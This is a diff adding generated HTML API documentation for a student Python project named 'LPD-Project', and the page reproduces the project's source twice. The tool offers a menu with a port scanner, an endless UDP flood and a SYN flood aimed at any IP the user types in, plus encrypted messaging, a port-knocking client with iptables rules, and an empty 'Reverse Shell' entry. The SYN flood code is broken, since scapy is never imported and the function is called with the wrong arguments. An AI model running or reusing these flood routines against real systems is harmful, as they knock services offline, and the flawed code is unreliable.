@@ -1,0 +1,672 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1" />
+<meta name="generator" content="pdoc 0.10.0" />
+<title>LPD-Project API documentation</title>
+<meta name="description" content="" />
+<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/sanitize.min.css" integrity="sha256-PK9q560IAAa6WVRRh76LtCaI8pjTJ2z11v0miyNNjrs=" crossorigin>
+<link rel="preload stylesheet" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/10up-sanitize.css/11.0.1/typography.min.css" integrity="sha256-7l/o7C8jubJiy74VsKTidCy1yBkRtiUGbVkYBylBqUg=" crossorigin>
+<link rel="stylesheet preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/styles/github.min.css" crossorigin>
+<style>:root{--highlight-color:#fe9}.flex{display:flex !important}body{line-height:1.5em}#content{padding:20px}#sidebar{padding:30px;overflow:hidden}#sidebar > *:last-child{margin-bottom:2cm}.http-server-breadcrumbs{font-size:130%;margin:0 0 15px 0}#footer{font-size:.75em;padding:5px 30px;border-top:1px solid #ddd;text-align:right}#footer p{margin:0 0 0 1em;display:inline-block}#footer p:last-child{margin-right:30px}h1,h2,h3,h4,h5{font-weight:300}h1{font-size:2.5em;line-height:1.1em}h2{font-size:1.75em;margin:1em 0 .50em 0}h3{font-size:1.4em;margin:25px 0 10px 0}h4{margin:0;font-size:105%}h1:target,h2:target,h3:target,h4:target,h5:target,h6:target{background:var(--highlight-color);padding:.2em 0}a{color:#058;text-decoration:none;transition:color .3s ease-in-out}a:hover{color:#e82}.title code{font-weight:bold}h2[id^="header-"]{margin-top:2em}.ident{color:#900}pre code{background:#f8f8f8;font-size:.8em;line-height:1.4em}code{background:#f2f2f1;padding:1px 4px;overflow-wrap:break-word}h1 code{background:transparent}pre{background:#f8f8f8;border:0;border-top:1px solid #ccc;border-bottom:1px solid #ccc;margin:1em 0;padding:1ex}#http-server-module-list{display:flex;flex-flow:column}#http-server-module-list div{display:flex}#http-server-module-list dt{min-width:10%}#http-server-module-list p{margin-top:0}.toc ul,#index{list-style-type:none;margin:0;padding:0}#index code{background:transparent}#index h3{border-bottom:1px solid #ddd}#index ul{padding:0}#index h4{margin-top:.6em;font-weight:bold}@media (min-width:200ex){#index .two-column{column-count:2}}@media (min-width:300ex){#index .two-column{column-count:3}}dl{margin-bottom:2em}dl dl:last-child{margin-bottom:4em}dd{margin:0 0 1em 3em}#header-classes + dl > dd{margin-bottom:3em}dd dd{margin-left:2em}dd p{margin:10px 0}.name{background:#eee;font-weight:bold;font-size:.85em;padding:5px 10px;display:inline-block;min-width:40%}.name:hover{background:#e0e0e0}dt:target .name{background:var(--highlight-color)}.name > span:first-child{white-space:nowrap}.name.class > span:nth-child(2){margin-left:.4em}.inherited{color:#999;border-left:5px solid #eee;padding-left:1em}.inheritance em{font-style:normal;font-weight:bold}.desc h2{font-weight:400;font-size:1.25em}.desc h3{font-size:1em}.desc dt code{background:inherit}.source summary,.git-link-div{color:#666;text-align:right;font-weight:400;font-size:.8em;text-transform:uppercase}.source summary > *{white-space:nowrap;cursor:pointer}.git-link{color:inherit;margin-left:1em}.source pre{max-height:500px;overflow:auto;margin:0}.source pre code{font-size:12px;overflow:visible}.hlist{list-style:none}.hlist li{display:inline}.hlist li:after{content:',\2002'}.hlist li:last-child:after{content:none}.hlist .hlist{display:inline;padding-left:1em}img{max-width:100%}td{padding:0 .5em}.admonition{padding:.1em .5em;margin-bottom:1em}.admonition-title{font-weight:bold}.admonition.note,.admonition.info,.admonition.important{background:#aef}.admonition.todo,.admonition.versionadded,.admonition.tip,.admonition.hint{background:#dfd}.admonition.warning,.admonition.versionchanged,.admonition.deprecated{background:#fd4}.admonition.error,.admonition.danger,.admonition.caution{background:lightpink}</style>
+<style media="screen and (min-width: 700px)">@media screen and (min-width:700px){#sidebar{width:30%;height:100vh;overflow:auto;position:sticky;top:0}#content{width:70%;max-width:100ch;padding:3em 4em;border-left:1px solid #ddd}pre code{font-size:1em}.item .name{font-size:1em}main{display:flex;flex-direction:row-reverse;justify-content:flex-end}.toc ul ul,#index ul{padding-left:1.5em}.toc > ul > li{margin-top:.5em}}</style>
+<style media="print">@media print{#sidebar h1{page-break-before:always}.source{display:none}}@media print{*{background:transparent !important;color:#000 !important;box-shadow:none !important;text-shadow:none !important}a[href]:after{content:" (" attr(href) ")";font-size:90%}a[href][title]:after{content:none}abbr[title]:after{content:" (" attr(title) ")"}.ir a:after,a[href^="javascript:"]:after,a[href^="#"]:after{content:""}pre,blockquote{border:1px solid #999;page-break-inside:avoid}thead{display:table-header-group}tr,img{page-break-inside:avoid}img{max-width:100% !important}@page{margin:0.5cm}p,h2,h3{orphans:3;widows:3}h1,h2,h3,h4,h5,h6{page-break-after:avoid}}</style>
+<script defer src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/highlight.min.js" integrity="sha256-Uv3H6lx7dJmRfRvH8TH6kJD1TSK1aFcwgx+mdg3epi8=" crossorigin></script>
+<script>window.addEventListener('DOMContentLoaded', () => hljs.initHighlighting())</script>
+</head>
+<body>
+<main>
+<article id="content">
+<header>
+<h1 class="title">Module <code>LPD-Project</code></h1>
+</header>
+<section id="section-intro">
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">import os
+import socket
+import ipaddress
+import random
+import time
+import string
+import subprocess
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from reportlab.pdfgen import canvas
+
+
+
+
+
+# Lista para armazenar a história das operações
+operation_history = []
+
+def append_to_history(text):
+    &#34;&#34;&#34;Adiciona um texto à história de operações.&#34;&#34;&#34;
+    operation_history.append(text)
+
+def input_with_history(prompt):
+    &#34;&#34;&#34;Captura a entrada do usuário adicionando-a à história.&#34;&#34;&#34;
+    user_input = input(prompt)
+    append_to_history(f&#34;{prompt}{user_input}&#34;)
+    return user_input
+
+def export_history_to_pdf(filename=&#34;operation_history.pdf&#34;):
+    &#34;&#34;&#34;Exporta a história das operações para um arquivo PDF.&#34;&#34;&#34;
+    c = canvas.Canvas(filename)
+    y_position = 800
+    for text in operation_history:
+        c.drawString(72, y_position, text)
+        y_position -= 10
+    c.save()
+    print(f&#34;História das operações exportada para {filename}.&#34;)
+
+
+    
+
+
+# Parte das funções abaixo foram adaptadas dos exemplos demonstrados em aula no IPBeja pelo Professor Armando Ventura no módulo de Linguagens de Programação Dinâmicas. 
+
+def varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final):
+    faixa_ip = ipaddress.IPv4Network(faixa_ips_alvo, strict=False)
+
+    for ip_alvo in faixa_ip:
+        portas_abertas = []
+        portas_fechadas = 0
+
+        for porta in range(porta_inicial, porta_final + 1):
+            soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            soquete.settimeout(1)
+
+            resultado = soquete.connect_ex((str(ip_alvo), porta))
+            soquete.close()
+
+            if resultado == 0:
+                portas_abertas.append(str(porta))
+            else:
+                portas_fechadas += 1
+
+        print(f&#34;\nResultados para o IP {ip_alvo}:&#34;)
+        print(&#34;Portas abertas: &#34; + &#34;, &#34;.join(portas_abertas))
+        print(f&#34;Número de Portas Fechadas: {portas_fechadas}&#34;)
+
+
+def flood_udp(ip_alvo):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_to_send = random._urandom(1024)
+
+    sent = 0
+    while True:
+        sock.sendto(bytes_to_send, (ip_alvo, random.randint(1, 65535)))
+        sent += 1
+        print(f&#34;Sent {sent} amount of packets to {ip_alvo}&#34;)
+        # Caso queira limitar o número de Pacotes ---&gt;
+        # if sent &gt;= 100000:
+            # break
+        # Caso queira limitar o número de Pacotes &lt;---
+
+
+# Based on &#34;How to Make a SYN Flooding Attack in Python&#34; / &#34;Abdeladim Fadheli&#34; Article - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python ---&gt;
+def syn_flood(ip_alvo):
+    porta_alvo = int(input(&#34;Digite a porta alvo: &#34;))
+    ip = IP(dst=ip_alvo)
+    tcp = TCP(sport=RandShort(), dport=porta_alvo, flags=&#34;S&#34;)
+    raw = Raw(b&#34;X&#34;*1024)
+    p = ip / tcp / raw
+    send(p, loop=1, verbose=0)
+# Based on &#34;How to Make a SYN Flooding Attack in Python&#34; / &#34;Abdeladim Fadheli&#34; Article - https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python &lt;---
+ 
+
+# Conjunto de Funções para a Troca de Mensagens Servidor/Cliente ---&gt;
+def generate_key_from_password(password, salt):
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=100000,
+        backend=default_backend()
+    )
+    key = kdf.derive(password.encode()) 
+    return key
+
+def encrypt_message(key, message, salt):
+    cipher = AES.new(key, AES.MODE_CBC)
+    ct_bytes = cipher.encrypt(pad(message, AES.block_size))
+    return salt + cipher.iv + ct_bytes  
+
+def decrypt_message(password, encrypted_message):
+    salt = encrypted_message[:16]
+    iv = encrypted_message[16:32]
+    ct = encrypted_message[32:]
+    key = generate_key_from_password(password, salt)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    pt = unpad(cipher.decrypt(ct), AES.block_size)
+    return pt
+
+def server_side(port, password):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((&#39;127.0.0.1&#39;, port))
+        s.listen()
+        conn, addr = s.accept()
+        conn.send(&#34;Conectado&#34;.encode())
+        dataFromClient = conn.recv(4096)
+        decrypted_data = decrypt_message(password, dataFromClient)
+        print(decrypted_data.decode())
+        conn.close()
+    except Exception as e:
+        print(f&#34;An error occurred: {e}&#34;)
+
+def client_side(ip, port, password):
+    try:
+        salt = os.urandom(16) 
+        key = generate_key_from_password(password, salt)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        dataFromServer = s.recv(1024)
+        print(dataFromServer.decode())
+        dataToServer = &#34;Conectando&#34;
+        encrypted_data = encrypt_message(key, dataToServer.encode(), salt)
+        s.send(encrypted_data)
+        s.close()
+    except Exception as e:
+        print(f&#34;An error occurred: {e}&#34;)
+# Conjunto de Funções para a Troca de Mensagens Servidor/Cliente &lt;---
+
+
+def port_knocking():
+    target_ip = input(&#34;Digite o endereço IP do servidor alvo: &#34;)
+    knocking_ports = [int(port) for port in input(&#34;Digite as portas para o port knocking (separadas por espaço): &#34;).split()]
+    for port in knocking_ports:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.sendto(b&#39;&#39;, (target_ip, port))
+            time.sleep(1) # Define o tempo de comunicação entre as portas
+
+
+def Menu_do_Programa():
+    os.system(&#39;clear&#39;)
+    print(&#34;\nLPD-Project | Linguagens de Programação Dinâmicas\n&#34;)
+    print(&#34;1- Port Scan&#34;)
+    print(&#34;2- UDP Flood&#34;)
+    print(&#34;3- SYN Flood&#34;)
+    print(&#34;(Em Desenvolvimento) 4- Análise e Processamento de Ficheiros de Log&#34;)
+    print(&#34;5- Troca de Mensagens&#34;)
+    print(&#34;6- Client Port Knocking&#34;)
+    print(&#34;7- Reverse Shell&#34;)
+    print(&#34;\n0- Sair\n&#34;)
+
+
+def main():
+    while True:
+        Menu_do_Programa()
+        escolha = input(&#34;Escolha uma opção: &#34;)
+        os.system(&#39;clear&#39;)
+
+        if escolha == &#34;1&#34;:
+            print(&#34;1- Port Scan\n&#34;)
+            
+            faixa_ips_alvo = input(&#34;Digite o IP(s) alvo (Ex. 192.168.0.1-25): &#34;)
+            porta_inicial, porta_final = map(int, input(&#34;Digite o intervalo de portas (Ex 1-1000): &#34;).split(&#39;-&#39;))
+            varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final)
+            if input_with_history(&#34;Deseja exportar os resultados para PDF? (S/N): &#34;).lower() == &#39;s&#39;:
+                export_history_to_pdf()
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;2&#34;:
+            print(&#34;2- UDP Flood\n&#34;)
+            ip_alvo = input(&#34;Digite o IP alvo: &#34;)
+            flood_udp(ip_alvo)
+
+        elif escolha == &#34;3&#34;:
+            print(&#34;3- SYN Flood\n&#34;)
+            ip_alvo = input(&#34;Digite o IP alvo: &#34;)
+            porta_alvo = int(input(&#34;Digite a porta alvo: &#34;))
+            syn_flood(ip_alvo, porta_alvo)
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;4&#34;:
+            print(&#34;4- Análise e Processamento de Ficheiros de Log\n&#34;)
+            print(&#34;Este módulo está em construção. Atualize o código e volte mais tarde, obrigado!\n\n&#34;)
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;5&#34;:
+            print(&#34;5- Troca de Mensagens\n&#34;)
+            escolha_server_client = input(&#34;Digite 1 para servidor ou 2 para cliente: &#34;)
+            if escolha_server_client == &#39;1&#39;:
+                port = int(input(&#34;Digite a porta do servidor: &#34;))
+                password = input(&#34;Digite a senha para criptografia: &#34;)
+                server_side(port, password)
+            elif escolha_server_client == &#39;2&#39;:
+                ip = input(&#34;Digite o IP do servidor: &#34;)
+                port = int(input(&#34;Digite a porta do servidor: &#34;))
+                password = input(&#34;Digite a senha para criptografia: &#34;)
+                client_side(ip, port, password)
+            else:
+                print(&#34;Opção inválida.&#34;)
+                input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;6&#34;:
+            print(&#34;6- Client Port Knocking\n&#34;)
+            print(&#34;Para configurar um servidor, primeiro utilize seguinte script: \n\n* filter\n:INPUT DROP [0:0]\n:FORWARD DROP [0:0]\n:OUTPUT ACCEPT [0:0]\n:TRAFFIC - [0:0]\n:SSH-INPUT - [0:0]\n:SSH-INPUTTWO - [0:0]\n# TRAFFIC chain for Port Knocking. The correct port sequence in this example is 8881 -&gt; 7777 -&gt; 9991; any other sequence will drop the traffic\n-A INPUT -j TRAFFIC\n-A TRAFFIC -p icmp --icmp-type any -j ACCEPT\n-A TRAFFIC -m state --state ESTABLISHED, RELATED -j ACCEPT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 22 -m recent --rcheck --seconds 30 --name SSH2 -j ACCEPT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSH2 --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 9991 -m recent --rcheck --name SSH1 -j SSH-INPUTTWO\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSH1 --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 7777 -m recent --rcheck --name SSHO -j SSH-INPUT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSHO --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 8881 -m recent --name SSHO --set -j DROP\n-A SSH-INPUT -m recent --name SSH1 --set -j DROP\n-A SSH-INPUTTWO -m recent --name SSH2 --set -j DROP\n-A TRAFFIC -j DROP\nCOMMIT\n# END or further rules&#34;)
+            input(&#34;Pressione Enter para continuar...&#34;)
+            os.system(&#39;clear&#39;)
+            port_knocking()
+            input(&#34;Pressione Enter para continuar...&#34;)
+            os.system(&#39;clear&#39;)
+
+        elif escolha == &#34;7&#34;:
+            print(&#34;7- Reverse Shell\n&#34;)
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;0&#34;:
+            print(&#34;Saindo do programa...&#34;)
+            break
+
+        else:
+            print(&#34;Opção Inválida&#34;)
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+
+if __name__ == &#34;__main__&#34;:
+    main()</code></pre>
+</details>
+</section>
+<section>
+</section>
+<section>
+</section>
+<section>
+<h2 class="section-title" id="header-functions">Functions</h2>
+<dl>
+<dt id="LPD-Project.Menu_do_Programa"><code class="name flex">
+<span>def <span class="ident">Menu_do_Programa</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def Menu_do_Programa():
+    os.system(&#39;clear&#39;)
+    print(&#34;\nLPD-Project | Linguagens de Programação Dinâmicas\n&#34;)
+    print(&#34;1- Port Scan&#34;)
+    print(&#34;2- UDP Flood&#34;)
+    print(&#34;3- SYN Flood&#34;)
+    print(&#34;(Em Desenvolvimento) 4- Análise e Processamento de Ficheiros de Log&#34;)
+    print(&#34;5- Troca de Mensagens&#34;)
+    print(&#34;6- Client Port Knocking&#34;)
+    print(&#34;7- Reverse Shell&#34;)
+    print(&#34;\n0- Sair\n&#34;)</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.append_to_history"><code class="name flex">
+<span>def <span class="ident">append_to_history</span></span>(<span>text)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Adiciona um texto à história de operações.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def append_to_history(text):
+    &#34;&#34;&#34;Adiciona um texto à história de operações.&#34;&#34;&#34;
+    operation_history.append(text)</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.client_side"><code class="name flex">
+<span>def <span class="ident">client_side</span></span>(<span>ip, port, password)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def client_side(ip, port, password):
+    try:
+        salt = os.urandom(16) 
+        key = generate_key_from_password(password, salt)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        dataFromServer = s.recv(1024)
+        print(dataFromServer.decode())
+        dataToServer = &#34;Conectando&#34;
+        encrypted_data = encrypt_message(key, dataToServer.encode(), salt)
+        s.send(encrypted_data)
+        s.close()
+    except Exception as e:
+        print(f&#34;An error occurred: {e}&#34;)</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.decrypt_message"><code class="name flex">
+<span>def <span class="ident">decrypt_message</span></span>(<span>password, encrypted_message)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def decrypt_message(password, encrypted_message):
+    salt = encrypted_message[:16]
+    iv = encrypted_message[16:32]
+    ct = encrypted_message[32:]
+    key = generate_key_from_password(password, salt)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    pt = unpad(cipher.decrypt(ct), AES.block_size)
+    return pt</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.encrypt_message"><code class="name flex">
+<span>def <span class="ident">encrypt_message</span></span>(<span>key, message, salt)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def encrypt_message(key, message, salt):
+    cipher = AES.new(key, AES.MODE_CBC)
+    ct_bytes = cipher.encrypt(pad(message, AES.block_size))
+    return salt + cipher.iv + ct_bytes  </code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.export_history_to_pdf"><code class="name flex">
+<span>def <span class="ident">export_history_to_pdf</span></span>(<span>filename='operation_history.pdf')</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Exporta a história das operações para um arquivo PDF.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def export_history_to_pdf(filename=&#34;operation_history.pdf&#34;):
+    &#34;&#34;&#34;Exporta a história das operações para um arquivo PDF.&#34;&#34;&#34;
+    c = canvas.Canvas(filename)
+    y_position = 800
+    for text in operation_history:
+        c.drawString(72, y_position, text)
+        y_position -= 10
+    c.save()
+    print(f&#34;História das operações exportada para {filename}.&#34;)</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.flood_udp"><code class="name flex">
+<span>def <span class="ident">flood_udp</span></span>(<span>ip_alvo)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def flood_udp(ip_alvo):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_to_send = random._urandom(1024)
+
+    sent = 0
+    while True:
+        sock.sendto(bytes_to_send, (ip_alvo, random.randint(1, 65535)))
+        sent += 1
+        print(f&#34;Sent {sent} amount of packets to {ip_alvo}&#34;)
+        # Caso queira limitar o número de Pacotes ---&gt;
+        # if sent &gt;= 100000:
+            # break
+        # Caso queira limitar o número de Pacotes &lt;---</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.generate_key_from_password"><code class="name flex">
+<span>def <span class="ident">generate_key_from_password</span></span>(<span>password, salt)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def generate_key_from_password(password, salt):
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=100000,
+        backend=default_backend()
+    )
+    key = kdf.derive(password.encode()) 
+    return key</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.input_with_history"><code class="name flex">
+<span>def <span class="ident">input_with_history</span></span>(<span>prompt)</span>
+</code></dt>
+<dd>
+<div class="desc"><p>Captura a entrada do usuário adicionando-a à história.</p></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def input_with_history(prompt):
+    &#34;&#34;&#34;Captura a entrada do usuário adicionando-a à história.&#34;&#34;&#34;
+    user_input = input(prompt)
+    append_to_history(f&#34;{prompt}{user_input}&#34;)
+    return user_input</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.main"><code class="name flex">
+<span>def <span class="ident">main</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def main():
+    while True:
+        Menu_do_Programa()
+        escolha = input(&#34;Escolha uma opção: &#34;)
+        os.system(&#39;clear&#39;)
+
+        if escolha == &#34;1&#34;:
+            print(&#34;1- Port Scan\n&#34;)
+            
+            faixa_ips_alvo = input(&#34;Digite o IP(s) alvo (Ex. 192.168.0.1-25): &#34;)
+            porta_inicial, porta_final = map(int, input(&#34;Digite o intervalo de portas (Ex 1-1000): &#34;).split(&#39;-&#39;))
+            varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final)
+            if input_with_history(&#34;Deseja exportar os resultados para PDF? (S/N): &#34;).lower() == &#39;s&#39;:
+                export_history_to_pdf()
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;2&#34;:
+            print(&#34;2- UDP Flood\n&#34;)
+            ip_alvo = input(&#34;Digite o IP alvo: &#34;)
+            flood_udp(ip_alvo)
+
+        elif escolha == &#34;3&#34;:
+            print(&#34;3- SYN Flood\n&#34;)
+            ip_alvo = input(&#34;Digite o IP alvo: &#34;)
+            porta_alvo = int(input(&#34;Digite a porta alvo: &#34;))
+            syn_flood(ip_alvo, porta_alvo)
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;4&#34;:
+            print(&#34;4- Análise e Processamento de Ficheiros de Log\n&#34;)
+            print(&#34;Este módulo está em construção. Atualize o código e volte mais tarde, obrigado!\n\n&#34;)
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;5&#34;:
+            print(&#34;5- Troca de Mensagens\n&#34;)
+            escolha_server_client = input(&#34;Digite 1 para servidor ou 2 para cliente: &#34;)
+            if escolha_server_client == &#39;1&#39;:
+                port = int(input(&#34;Digite a porta do servidor: &#34;))
+                password = input(&#34;Digite a senha para criptografia: &#34;)
+                server_side(port, password)
+            elif escolha_server_client == &#39;2&#39;:
+                ip = input(&#34;Digite o IP do servidor: &#34;)
+                port = int(input(&#34;Digite a porta do servidor: &#34;))
+                password = input(&#34;Digite a senha para criptografia: &#34;)
+                client_side(ip, port, password)
+            else:
+                print(&#34;Opção inválida.&#34;)
+                input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;6&#34;:
+            print(&#34;6- Client Port Knocking\n&#34;)
+            print(&#34;Para configurar um servidor, primeiro utilize seguinte script: \n\n* filter\n:INPUT DROP [0:0]\n:FORWARD DROP [0:0]\n:OUTPUT ACCEPT [0:0]\n:TRAFFIC - [0:0]\n:SSH-INPUT - [0:0]\n:SSH-INPUTTWO - [0:0]\n# TRAFFIC chain for Port Knocking. The correct port sequence in this example is 8881 -&gt; 7777 -&gt; 9991; any other sequence will drop the traffic\n-A INPUT -j TRAFFIC\n-A TRAFFIC -p icmp --icmp-type any -j ACCEPT\n-A TRAFFIC -m state --state ESTABLISHED, RELATED -j ACCEPT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 22 -m recent --rcheck --seconds 30 --name SSH2 -j ACCEPT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSH2 --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 9991 -m recent --rcheck --name SSH1 -j SSH-INPUTTWO\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSH1 --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 7777 -m recent --rcheck --name SSHO -j SSH-INPUT\n-A TRAFFIC -m state --state NEW -m tcp -p tcp -m recent --name SSHO --remove -j DROP\n-A TRAFFIC -m state --state NEW -m tcp -p tcp --dport 8881 -m recent --name SSHO --set -j DROP\n-A SSH-INPUT -m recent --name SSH1 --set -j DROP\n-A SSH-INPUTTWO -m recent --name SSH2 --set -j DROP\n-A TRAFFIC -j DROP\nCOMMIT\n# END or further rules&#34;)
+            input(&#34;Pressione Enter para continuar...&#34;)
+            os.system(&#39;clear&#39;)
+            port_knocking()
+            input(&#34;Pressione Enter para continuar...&#34;)
+            os.system(&#39;clear&#39;)
+
+        elif escolha == &#34;7&#34;:
+            print(&#34;7- Reverse Shell\n&#34;)
+            input(&#34;Pressione Enter para continuar...&#34;)
+
+        elif escolha == &#34;0&#34;:
+            print(&#34;Saindo do programa...&#34;)
+            break
+
+        else:
+            print(&#34;Opção Inválida&#34;)
+            input(&#34;Pressione Enter para continuar...&#34;)</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.port_knocking"><code class="name flex">
+<span>def <span class="ident">port_knocking</span></span>(<span>)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def port_knocking():
+    target_ip = input(&#34;Digite o endereço IP do servidor alvo: &#34;)
+    knocking_ports = [int(port) for port in input(&#34;Digite as portas para o port knocking (separadas por espaço): &#34;).split()]
+    for port in knocking_ports:
+        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+            s.sendto(b&#39;&#39;, (target_ip, port))
+            time.sleep(1) # Define o tempo de comunicação entre as portas</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.server_side"><code class="name flex">
+<span>def <span class="ident">server_side</span></span>(<span>port, password)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def server_side(port, password):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((&#39;127.0.0.1&#39;, port))
+        s.listen()
+        conn, addr = s.accept()
+        conn.send(&#34;Conectado&#34;.encode())
+        dataFromClient = conn.recv(4096)
+        decrypted_data = decrypt_message(password, dataFromClient)
+        print(decrypted_data.decode())
+        conn.close()
+    except Exception as e:
+        print(f&#34;An error occurred: {e}&#34;)</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.syn_flood"><code class="name flex">
+<span>def <span class="ident">syn_flood</span></span>(<span>ip_alvo)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def syn_flood(ip_alvo):
+    porta_alvo = int(input(&#34;Digite a porta alvo: &#34;))
+    ip = IP(dst=ip_alvo)
+    tcp = TCP(sport=RandShort(), dport=porta_alvo, flags=&#34;S&#34;)
+    raw = Raw(b&#34;X&#34;*1024)
+    p = ip / tcp / raw
+    send(p, loop=1, verbose=0)</code></pre>
+</details>
+</dd>
+<dt id="LPD-Project.varredura_de_portas"><code class="name flex">
+<span>def <span class="ident">varredura_de_portas</span></span>(<span>faixa_ips_alvo, porta_inicial, porta_final)</span>
+</code></dt>
+<dd>
+<div class="desc"></div>
+<details class="source">
+<summary>
+<span>Expand source code</span>
+</summary>
+<pre><code class="python">def varredura_de_portas(faixa_ips_alvo, porta_inicial, porta_final):
+    faixa_ip = ipaddress.IPv4Network(faixa_ips_alvo, strict=False)
+
+    for ip_alvo in faixa_ip:
+        portas_abertas = []
+        portas_fechadas = 0
+
+        for porta in range(porta_inicial, porta_final + 1):
+            soquete = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            soquete.settimeout(1)
+
+            resultado = soquete.connect_ex((str(ip_alvo), porta))
+            soquete.close()
+
+            if resultado == 0:
+                portas_abertas.append(str(porta))
+            else:
+                portas_fechadas += 1
+
+        print(f&#34;\nResultados para o IP {ip_alvo}:&#34;)
+        print(&#34;Portas abertas: &#34; + &#34;, &#34;.join(portas_abertas))
+        print(f&#34;Número de Portas Fechadas: {portas_fechadas}&#34;)</code></pre>
+</details>
+</dd>
+</dl>
+</section>
+<section>
+</section>
+</article>
+<nav id="sidebar">
+<h1>Index</h1>
+<div class="toc">
+<ul></ul>
+</div>
+<ul id="index">
